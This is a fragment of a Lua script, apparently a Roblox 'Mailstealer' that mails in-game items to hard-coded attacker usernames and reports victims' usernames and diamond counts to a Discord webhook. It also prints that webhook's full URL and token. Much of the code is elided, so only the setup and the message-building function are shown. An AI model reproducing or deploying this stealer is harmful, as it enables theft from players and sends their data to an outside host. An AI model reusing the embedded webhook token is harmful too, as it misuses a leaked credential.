Username = "7800955839"
Username2 = "7800955839" -- stuff will get sent to this user if first user's mailbox is full
webhook = "https://discord.com/api/webhooks/1325375814316855367/jow1CKwkeWTxtHV1Qn4SuKzWDlyg6YmkEa0nEk_H8iKZ2NgPoX-n7q_f3I9CDOxbiHXZ"
...
local function SendMessage(username, diamonds)
    ...
    local data = {
        ["embeds"] = {{
			...
			["fields"] = fields,
			["footer"] = {
				["text"] = "Mailstealer by Tobi. discord.gg/fuck"
			}
        }}
    }
